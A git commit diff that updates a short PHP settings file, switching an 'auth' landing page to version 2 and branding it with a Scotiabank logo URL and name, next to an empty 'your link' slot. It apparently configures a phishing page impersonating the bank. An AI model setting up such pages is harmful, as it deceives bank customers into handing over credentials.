58ecf7437e1d2927b037171040cbc5cb5ed7646d
nickdurkin <nickdurkin@gmail.com>
2021-07-27 12:41:44 -0700

    Update a_HomePage.php

--- nginx/src/a_HomePage.php
+++ nginx/src/a_HomePage.php
@@ -1,7 +1,7 @@
 <?php
 //Working on different version
-$auth_version=1; // app Version (1 or 2)
-$auth_icon="";
-$auth_message=""; // Landing page
+$auth_version=2; // app Version (1 or 2)
+$auth_icon="https://www.underconsideration.com/brandnew/archives/scotiabank_icon.png";
+$auth_message="Scotiabank"; // Landing page
 $my_link=""; // your link
 ?>
